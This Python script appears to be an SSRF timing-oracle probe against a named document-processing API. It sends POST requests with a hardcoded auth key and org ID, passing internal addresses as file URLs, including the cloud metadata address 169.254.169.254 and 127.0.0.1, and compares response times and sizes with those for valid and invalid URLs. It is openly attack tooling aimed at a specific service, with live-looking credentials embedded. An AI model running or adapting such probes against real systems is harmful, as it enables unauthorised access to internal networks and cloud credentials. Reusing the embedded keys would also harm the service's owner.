#!/usr/bin/env python3
"""Timing oracle: valid vs SSRF vs invalid URL response times."""
import requests, time, sys

endpoint = "https://api-dev.gcp.lzrops.com/api/engine/internal"
authkey = "02f3fe59c03542d5b289"
orgid = "-ackji3v1kc5nl58iaoq"
headers = {
    "apiversion": "2026-03-31",
    "authkey": authkey,
    "orgid": orgid,
    "content-type": "application/json",
}

urls = [
    ("valid_pdf", "https://firebasestorage.googleapis.com/v0/b/lazarus-apis-testing.appspot.com/o/examples%2FSample%20Form.pdf?alt=media&token=5b537052-ea54-4be4-9d36-9620ee994c1c"),
    ("ssrf_metadata", "http://169.254.169.254/"),
    ("invalid_domain", "http://nonexistent.invalid.domain/"),
    ("ssrf_localhost", "http://127.0.0.1/"),
    ("bad_url", "https://example.com/nonexistent.pdf"),
]

for name, url in urls:
    body = {
        "metadata": {},
        "rasterize": True,
        "settings": {
            "modelSettings": {"modelName": "gpt-4o", "max_tokens": "16384"},
            "contextSettings": {
                "context_granularity": "page", "images_only": False,
                "include_ocr_input": True, "max_context": 25,
                "text_only": False, "variable_context_size": False,
                "split_page_images": True,
            },
        },
        "staticIP": False,
        "input": {"file": {"url": url}, "prompt": "What is this?"},
        "inputId": f"oracle_{name}",
    }
    t0 = time.perf_counter()
    try:
        r = requests.post(endpoint, headers=headers, json=body, timeout=30)
        elapsed = (time.perf_counter() - t0) * 1000
        print(f"{name}: status={r.status_code} time={elapsed:.0f}ms size={len(r.text)}")
    except requests.exceptions.Timeout:
        print(f"{name}: status=0 time=30000ms size=0")
    except Exception as e:
        print(f"{name}: status=0 time={(time.perf_counter()-t0)*1000:.0f}ms size=0 err={type(e).__name__}")
    time.sleep(1)
